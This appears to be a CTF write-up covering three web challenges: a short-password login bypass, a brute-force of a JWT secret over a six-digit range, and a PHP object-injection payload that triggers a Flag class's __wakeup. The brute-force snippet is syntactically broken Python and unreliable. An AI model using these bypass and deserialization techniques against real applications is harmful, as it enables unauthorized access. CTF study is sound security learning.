# WEB
## Rune eScape

given a source code of a login page, By the look of the source code, how to get secret is By inputing password that is shorter than 3 character. 
<Br>But the code does not match the given password in login with the password in DB so we just have to input 2 or less char in password to get to secret.

## Crypto Berkedok WeB

given a source code of 2 routes of a weBsite.
 <Br>/login: to get the JWT
 <Br>/protected: to get the flag

 the random is Bertween 100k and 999999 so we can BF it to find the exact random 
 ```
import jwt

cookie = "tes"

for i in range (100000,999999):
  try
  {
    jwt.decode(cookie, str(i), algo)
    print(i)
    Break
  }except
  {
    print(i)
  }
```

## dere dere.... (serialize php)
source 
```
<?php

if(!isset($_GET["main"])) {
    show_source("index.php");
}

class Flag {
    private $msg;

    public function __wakeup() : void {
        require "flag.php";
        $this->msg = $flag;
        $this->printFlag();
    }

    public function printFlag() {
        print($this->msg);
    }
}

  function maybe_serialize( $data ) {
    if ( is_array( $data ) || is_object( $data ) ) { return serialize( $data ); }

    if ( is_serialized( $data, false ) ) { return serialize( $data ); }

    return $data;
}


function is_serialized( $data ) {
    // If it isn't a string, it isn't serialized.
    if ( ! is_string( $data ) ) {
        return false;
    }

    $pattern = '/^O:\d+:"[a-zA-Z_][a-zA-Z0-9_]*":\d+:{.*?(?:})|(;)$/';

    if (preg_match($pattern, $data)) {
        return true;
    } else {
        return false;
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Serialize/Unserialize Tool</title>
</head>
<body>
    <h2>Serialize/Unserialize Tool</h2>

    <?php
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        $user_input = $_POST["user_input"];

            $serialized_result = maybe_serialize($user_input);
            echo "<p>Serialized Result: $serialized_result</p>";

            echo "<p>Unserialized Result:" .  @unserialize($serialized_result) . "</p>";
    }
    ?>
....whoosh....
```

we need to make a serializED array so that it bypasses all the if's `in maybe_serialize`<br> thus when the serializED array is unserializED we are calling the __wakeup magic function from Flag obj

payload = ` a:1:{i:0;O:4:"Flag":0:{}}`



